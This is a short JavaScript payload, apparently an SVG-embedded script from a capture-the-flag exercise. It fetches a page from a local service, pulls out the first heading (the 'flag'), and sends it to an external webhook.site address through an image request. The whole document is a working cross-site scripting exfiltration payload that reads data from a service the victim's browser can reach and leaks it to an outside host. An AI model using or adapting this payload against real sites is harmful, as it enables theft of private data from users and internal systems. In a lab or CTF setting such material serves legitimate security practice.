svg.script:
fetch("http://localhost:8123/videos?filter=ncsc")
  .then(r => r.text())
  .then(html => {
    const match = html.match(/<h2[^>]*>(.*?)<\/h2>/);
    if (match) {
      const flag = match[1];
      const i = new Image();
      i.src = "https://webhook.site/e384bc4d-14d1-4f4d-a359-a99b9431d317?flag=" + encodeURIComponent(flag);
    }
  });
